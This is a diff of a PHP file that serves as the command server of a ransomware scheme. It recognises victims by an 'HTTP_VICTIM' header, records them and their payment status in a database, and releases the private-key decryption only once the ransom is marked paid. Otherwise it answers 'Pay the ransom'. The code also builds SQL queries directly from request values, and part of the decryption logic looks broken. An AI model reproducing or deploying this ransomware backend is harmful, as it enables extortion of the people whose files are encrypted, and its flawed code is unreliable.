@@ -1,5 +1,6 @@
 <?php
 include('update_db.php');
+$GLOBALS['sr'] = 1;
 
 function Connection(){
 	//Configuration of database
@@ -25,7 +26,6 @@ function checkValidity(){
 	foreach($headers as $header => $value){
 		if($header == "HTTP_VICTIM" && $value=="Yes"){
 			return 1;
-			//echo keyPairGeneration()->pubKey;	
 		}
 	}
 	return 0;
@@ -46,18 +46,22 @@ function hide(){
 }
 
 function returnDecrypted($dbconn,$key,$id){
-	$query = "SELECT payment_status from ransomware_details where identifier='$id';";
+	$private_key = file_get_contents("private.pem");
+    	$res = openssl_get_privatekey($private_key,getenv('RANSOM_KEY'));
+    	openssl_private_decrypt(base64_decode($id),$dec,$id);
+    	$id = $dec;
+	echo "$id";
+
+	$query = "SELECT payment_status from ransomware_details where id='$id';";
 	$result = pg_query($dbconn,$query);
 	$tmp = pg_fetch_row($result)[0];
 	if($tmp == 'Yes'){
-		$private_key = file_get_contents("private.pem");
 		$resStr = str_replace('-','+',$key);
-		$res = openssl_get_privatekey($private_key,getenv('RANSOM_KEY'));		
 		openssl_private_decrypt(base64_decode($resStr),$newsource,$res);
 		echo "$newsource";
 		update_database($id);
 	}
-	else if($result == 'No'){
+	else if($tmp == 'No'){
 		echo "Pay the ransom";
 	}
 	else{
@@ -72,6 +76,9 @@ function check1($dbconn){
 		returnDecrypted($dbconn,$key,$id);
 		return 1;
 	}
+	else{
+		return 0;
+	}
 }
 
 if(checkValidity()){
@@ -79,16 +86,27 @@ if(checkValidity()){
 	if(check1($dbconn)){
 		exit;
 	}
-	$result = pg_query($dbconn, "SELECT identifier FROM ransomware_details ORDER BY identifier DESC LIMiT 1;");
-	//echo "Working!";
+	$result = pg_query($dbconn, "SELECT sr FROM ransomware_details ORDER BY id DESC LIMIT 1;");
 	if(!$result){
 		pg_close();
 		abort();
 		exit;
 	}
-	$id=pg_fetch_row($result)[0];
+	$sr_no=pg_fetch_row($result)[0];
+
+	$result = pg_query($dbconn,"SELECT id from ransomware_details where sr="."$sr_no");
+	if(!$result){
+	    pg_close();
+	    abort();
+	    exit;
+	}
+
+	$id = pg_fetch_row($result)[0];
 	$id = $id+1;
-	$query = "INSERT INTO ransomware_details (identifier,payment_status) VALUES "."( '$id','No');";
+
+	$sno = $GLOBALS['sr'];
+	$GLOBALS['sr']=$GLOBALS['sr']+1;
+	$query = "INSERT INTO ransomware_details (sr,id,payment_status) VALUES "."('$sno', '$id','No');";
 	$result = pg_query($dbconn,$query);
 	//echo $result;
 	if(!$result){
